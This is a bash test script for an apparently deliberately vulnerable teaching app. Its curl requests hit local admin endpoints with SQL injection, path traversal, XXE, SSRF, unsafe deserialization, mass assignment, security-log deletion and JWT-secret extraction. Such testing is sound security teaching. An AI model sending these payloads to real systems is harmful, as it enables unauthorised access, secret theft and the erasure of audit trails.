#!/bin/bash

# Test script for new Admin Settings vulnerabilities
# This script tests all OWASP Top 10 vulnerabilities in the admin settings

API_BASE_URL=${API_BASE_URL:-"http://localhost:3001"}
echo "🔧 Testing Admin Settings Vulnerabilities at: $API_BASE_URL"
echo "================================================="

# First, register and login as admin
echo "1. Creating admin user..."
REGISTER_RESPONSE=$(curl -s -X POST "$API_BASE_URL/api/register" \
  -H "Content-Type: application/json" \
  -d '{"username":"testadmin","email":"admin@test.com","password":"admin123","role":"admin"}')

echo "Register response: $REGISTER_RESPONSE"

echo -e "\n2. Logging in as admin..."
LOGIN_RESPONSE=$(curl -s -X POST "$API_BASE_URL/api/login" \
  -H "Content-Type: application/json" \
  -d '{"username":"testadmin","password":"admin123"}')

TOKEN=$(echo $LOGIN_RESPONSE | jq -r '.token')
echo "Login successful, token obtained: ${TOKEN:0:20}..."

# Test each OWASP Top 10 vulnerability
echo -e "\n================================================="
echo "Testing OWASP Top 10 Vulnerabilities"
echo "================================================="

# A01 - Broken Access Control
echo -e "\n🔴 A01 - Broken Access Control"
curl -s -X POST "$API_BASE_URL/api/admin/execute-command" \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"command":"restart-server"}' | jq

# A02 - Cryptographic Failures
echo -e "\n🟠 A02 - Cryptographic Failures"
curl -s -X POST "$API_BASE_URL/api/admin/generate-hash" \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"password":"supersecret","method":"md5"}' | jq

# A03 - Injection
echo -e "\n🟡 A03 - Injection (SQL Injection)"
curl -s -X GET "$API_BASE_URL/api/admin/search-users?query=' OR '1'='1" \
  -H "Authorization: Bearer $TOKEN" | jq '.users | length'

# A04 - Insecure Design
echo -e "\n🔵 A04 - Insecure Design (Direct SQL Execution)"
curl -s -X POST "$API_BASE_URL/api/admin/execute-sql" \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"sql":"SELECT COUNT(*) as total FROM users"}' | jq

# A05 - Security Misconfiguration
echo -e "\n🟣 A05 - Security Misconfiguration (Path Traversal)"
curl -s -X GET "$API_BASE_URL/api/admin/read-file?path=package.json" \
  -H "Authorization: Bearer $TOKEN" | jq '.content | length'

# A06 - Vulnerable Components
echo -e "\n🟢 A06 - Vulnerable Components (XXE)"
curl -s -X POST "$API_BASE_URL/api/admin/process-xml" \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"xml":"<settings><theme>dark</theme></settings>","enableExternalEntities":true}' | jq

# A07 - Authentication Failures
echo -e "\n🔴 A07 - Authentication Failures (Session Hijacking)"
curl -s -X POST "$API_BASE_URL/api/admin/impersonate" \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"sessionId":"sess_123"}' | jq

# A08 - Software Integrity Failures
echo -e "\n🟠 A08 - Software Integrity Failures (Unsafe Deserialization)"
curl -s -X POST "$API_BASE_URL/api/admin/load-preferences" \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"serializedData":"{\"theme\":\"dark\",\"notifications\":true}","unsafe":true}' | jq

# A09 - Logging Failures
echo -e "\n🟡 A09 - Logging and Monitoring Failures"
curl -s -X GET "$API_BASE_URL/api/admin/security-logs" \
  -H "Authorization: Bearer $TOKEN" | jq '.logs | length'

curl -s -X DELETE "$API_BASE_URL/api/admin/security-logs" \
  -H "Authorization: Bearer $TOKEN" | jq

# A10 - SSRF
echo -e "\n🔵 A10 - Server-Side Request Forgery"
curl -s -X POST "$API_BASE_URL/api/admin/process-redirect" \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"url":"http://localhost:22"}' | jq

# Mass Assignment
echo -e "\n🟣 Mass Assignment Vulnerability"
curl -s -X POST "$API_BASE_URL/api/admin/create-user" \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"username":"hacker","email":"hacker@evil.com","role":"superadmin","isActive":true}' | jq

# Test configuration exposure
echo -e "\n🔴 Information Disclosure - Admin Settings"
curl -s -X GET "$API_BASE_URL/api/admin/settings" \
  -H "Authorization: Bearer $TOKEN" | jq '.security.jwtSecret'

echo -e "\n================================================="
echo "✅ All admin settings vulnerabilities tested!"
echo "================================================="
echo ""
echo "⚠️  REMEMBER: These are educational vulnerabilities!"
echo "   Never implement these patterns in production!"
echo ""
